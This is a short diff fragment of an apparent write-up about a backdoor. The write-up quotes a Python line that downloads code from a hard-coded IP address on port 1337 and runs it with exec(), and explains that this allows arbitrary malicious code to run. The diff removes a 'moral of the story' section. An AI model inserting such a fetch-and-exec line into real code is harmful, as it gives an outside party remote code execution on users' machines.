@@ -174,8 +174,3 @@ exec(o.urlopen("http://62.171.182.100:1337/bd").read().decode())#
 This is bad!
 The script sends a request to `http://62.171.182.100:1337/bd` and executes whatever it gets back.
 So I basically can send arbitrary malicious python code and it gets executed!
-
-
-## The moral of the story
-
-Don't trust my code!
